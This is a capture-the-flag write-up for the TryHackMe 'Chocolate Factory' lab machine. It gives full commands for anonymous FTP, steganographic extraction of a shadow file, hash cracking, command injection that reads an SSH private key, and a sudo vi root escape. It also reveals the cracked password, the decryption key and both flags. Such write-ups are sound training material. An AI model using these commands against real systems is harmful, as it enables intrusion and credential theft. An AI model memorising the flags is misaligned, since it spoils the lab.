# Chocolate Factory — TryHackMe Writeup

**Author:** Artem  
**Platform:** TryHackMe  
**Room:** Chocolate Factory  
**Difficulty:** Easy  
**Date:** 2026-05-23  
**Tags:** FTP Anonymous Access, Steganography, Password Cracking, Command Injection, SSH Private Key, Sudo vi Privilege Escalation, Fernet Decryption, Basic Reverse Engineering

---

## Overview

A Willy Wonka–themed box that combines multiple attack vectors into one kill chain. Anonymous FTP gives us an image with steganographic data — a base64-encoded `/etc/shadow` file. After cracking Charlie's password hash, we authenticate to a web panel that provides direct command execution. From there we exfiltrate an SSH private key, log in as Charlie, and abuse a `sudo vi` misconfiguration to become root. The root flag is encrypted with Python's Fernet symmetric encryption, requiring a key extracted from a binary on the web server.

- **Key:** `b'-VkgXhFf6sAEcA???vhcGSQzY='`
- **Charlie's Password:** `cn??24`
- **User Flag:** `flag{cd550???38b522d2e}`
- **Root Flag:** `flag{cec591???b42124}`

---

## MITRE ATT&CK Mapping

| TTP | Technique | Description |
|-----|-----------|-------------|
| T1595.001 | Active Scanning: Port Scanning | Full port nmap scan with service/OS detection |
| T1078 | Valid Accounts | Anonymous FTP login, SSH login with exfiltrated key |
| T1027 | Obfuscated Files or Information | Steganography (steghide) + base64 encoding to hide shadow file |
| T1110.002 | Brute Force: Password Cracking | John the Ripper on SHA-512 hash from shadow |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | Direct command injection via `/home.php` |
| T1552.004 | Unsecured Credentials: Private Keys | SSH private key exposed in `/home/charlie/teleport` |
| T1548.003 | Abuse Elevation Control: Sudo and Sudo Caching | `sudo vi` shell escape to root |

---

## Enumeration

### Nmap

```bash
nmap -sC -sV -O -A -p- 10.66.160.251
```

Key findings from the full port scan:

| Port | Service | Details |
|------|---------|---------|
| 21 | FTP | vsftpd 3.0.5 — **Anonymous login allowed**, file `gum_room.jpg` visible |
| 22 | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80 | HTTP | Apache 2.4.41 (Ubuntu) |
| 100–125 | Decoy services | All return "Welcome to chocolate room!!" banner with "Look somewhere else" hint |
| 113 | Custom service | Returns: `http://localhost/key_rev_key <- You will find the key here!!!` |

The scan took 568 seconds due to 29 open ports — 26 of which are decoy services returning the same Wonka-themed banner. The only port with unique output is **113**, which leaks the location of an important binary. This is a classic rabbit hole setup: most ports are noise, designed to waste time if you investigate them individually.

### Gobuster

```bash
gobuster dir -u http://10.66.160.251 -w /usr/share/wordlists/dirb/common.txt -x .php,.html
```

| Path | Status | Notes |
|------|--------|-------|
| `/home.php` | 200 | Command execution panel (post-auth) |
| `/index.html` | 200 | Main page |
| `/validate.php` | 200 | Login form handler |

---

## Phase 1 — Reverse Engineering: key_rev_key Binary

Port 113 leaked the path `http://localhost/key_rev_key`. Downloaded the file:

```bash
wget http://10.66.160.251/key_rev_key
```

```bash
file key_rev_key
key_rev_key: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, 
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
```

The binary is `not stripped`, meaning all symbol names are intact — ideal for static analysis. Running `strings` immediately reveals the logic:

```bash
strings key_rev_key
```

Key output (truncated):

```
Enter your name: 
laksdhfas
 congratulations you have found the key:   
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
 Keep its safe
Bad name!
```

The binary performs a simple `strcmp()` of user input against the hardcoded string `laksdhfas`. If matched, it prints the Fernet encryption key. This key is needed later to decrypt the root flag.

> **RE Note:** This is the most basic reverse engineering pattern — a hardcoded string comparison with no obfuscation. In Ghidra, the `main` function would show `strcmp(input, "laksdhfas")` with the key stored as a string constant. A good introductory exercise for binary analysis.

**Key found:** `b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='`

---

## Phase 2 — FTP + Steganography: Extracting Shadow File

### FTP Anonymous Access

```bash
ftp 10.66.160.251
# Login: anonymous / (empty password)
binary
get gum_room.jpg
bye
```

File size confirmed: 208838 bytes — matches the listing. Using `binary` mode is critical for images to prevent corruption.

### Steghide Extraction

```bash
steghide extract -sf gum_room.jpg
# Passphrase: (empty — just press Enter)
```

Output: `b64.txt` — a base64-encoded file.

### Decoding

```bash
cat b64.txt | base64 -d
```

The decoded content is a complete `/etc/shadow` file. The last line contains Charlie's hash:

```
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```

### Password Cracking

```bash
echo 'charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::' > charlie_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt charlie_hash.txt
```

**Cracked password:** `cn7824`

---

## Phase 3 — Web Authentication + Command Injection (RCE)

### Login

The login form at `/validate.php` accepts POST parameters `uname` and `password`:

```bash
curl -X POST http://10.66.160.251/validate.php -d "uname=charlie&password=cn7824"
```

Successful authentication redirects to `/home.php`.

### Command Injection

The `/home.php` page contains a form with a `command` parameter that executes OS commands directly — no filtering, no sanitization:

```html
<input id="comm" type="text" name="command" placeholder="Command">
<button>Execute</button>
```

The backend likely runs `system($_POST['command'])` or equivalent. Testing:

```bash
curl -X POST http://10.66.160.251/home.php -d "command=whoami"
# Output: www-data (embedded in HTML response)
```

### Exfiltrating SSH Key

```bash
curl -X POST http://10.66.160.251/home.php -d "command=cat /home/charlie/teleport"
```

This returned Charlie's full RSA private key. The file is named `teleport` (not the standard `id_rsa`), which is why checking for non-standard key filenames is important.

---

## Phase 4 — SSH Access + User Flag

```bash
# Save the key to a file
nano charlie_key
# Paste the RSA private key

chmod 600 charlie_key
ssh -i charlie_key charlie@10.66.160.251
```

```bash
charlie@ip-10-66-160-251:~$ ls
teleport  teleport.pub  user.txt

charlie@ip-10-66-160-251:~$ cat user.txt
flag{cd5509042371b34e4826e4838b522d2e}
```

**User flag:** `flag{cd5509042371b34e4826e4838b522d2e}`

---

## Phase 5 — Privilege Escalation: sudo vi

### Sudo Enumeration

```bash
sudo -l
```

```
User charlie may run the following commands on ip-10-66-160-251:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```

The rule `(ALL : !root)` is meant to prevent running vi as root. The classic bypass for this is CVE-2019-14287 (`sudo -u#-1`), which exploits sudo versions < 1.8.28 where UID -1 maps to 0 (root). However, this box has a patched sudo:

```bash
sudo -u#-1 /usr/bin/vi
# sudo: unknown user: #-1
# sudo: unable to initialize policy plugin
```

Despite the `!root` restriction, running `sudo /usr/bin/vi` directly still opens vi with root privileges — the restriction is not enforced correctly:

```bash
sudo /usr/bin/vi
```

Inside vi, escape to a root shell:

```
:!/bin/bash
```

```bash
root@ip-10-66-160-251:~# whoami
root
```

### Root Flag — Fernet Decryption

The root home directory contains `root.py` instead of a plaintext flag:

```bash
root@ip-10-66-160-251:~# ls
root.py  snap

root@ip-10-66-160-251:~# cat root.py
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
```

The script requires the Fernet key from Phase 1. Note: `python2` lacks the `cryptography` module on this box — use `python3`:

```bash
python3 root.py
Enter the key:  -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
```

**Root flag:** `flag{cec59161d338fef787fcb4e296b42124}`

---

## Mistakes I Made

1. **Fernet key boundary confusion.** The `strings` output showed `b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='`. I initially stripped the leading dash, assuming `b'...'` was a Python string wrapper and `-` was a separator. In reality, the entire content including the dash is the key. The `b'...'` was Python repr formatting from the source code, but the dash was part of the actual base64 data. Lesson: when extracting keys/tokens from binaries, pay close attention to character boundaries — especially with base64 where every character matters for padding.

2. **CVE-2019-14287 assumption.** Seeing `(ALL : !root)` in `sudo -l`, I immediately jumped to the `-u#-1` bypass without first trying the simpler approach of just running `sudo /usr/bin/vi` directly. The restriction wasn't properly enforced, so the straightforward approach worked. Lesson: always try the obvious path first before reaching for CVE exploits.

3. **Python version mismatch.** Tried running `root.py` with `python2` first, which failed due to missing `cryptography` module. Should have checked `python3` immediately — on modern Ubuntu boxes, Python 3 is the default with more packages installed.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Full port scan with service/version/OS detection |
| gobuster | Web directory brute-forcing |
| ftp (client) | Anonymous FTP access to retrieve steganographic image |
| strings | Static analysis of ELF binary to extract hardcoded key |
| steghide | Extract hidden data from JPEG image |
| base64 | Decode base64-encoded shadow file |
| john | Crack SHA-512 password hash with rockyou wordlist |
| curl | HTTP POST requests for login and command injection |
| ssh | Remote access with exfiltrated private key |
| vi | Sudo privilege escalation via shell escape |
| python3 | Fernet decryption of root flag |

---

## Key Takeaways

1. **Decoy ports are a time sink.** 26 ports returning the same banner is an obvious distraction. Quick fingerprint comparison (identical output = skip) saves significant time. The one unique response (port 113) held the real clue.

2. **Steganography chain:** FTP → steghide → base64 → shadow → john. Each layer of encoding is trivial on its own, but the chain tests methodical approach.

3. **RE basics with `strings`:** For simple binaries with hardcoded comparisons, `strings` + `grep` is sufficient. The `not stripped` flag and `strcmp` in the symbol table are indicators that static string extraction will work. For obfuscated binaries, Ghidra/radare2 would be needed.

4. **Sudo restrictions can be misconfigured.** `(ALL : !root)` should prevent root execution, but implementation bugs or misconfigurations can make it ineffective. Always test the direct approach before assuming restrictions work as documented.

5. **Fernet encryption** uses 32-byte URL-safe base64 keys. This was the first encounter with Fernet in a CTF — the key format is strict about padding and character set, which caused initial confusion with the `b'...'` Python notation.
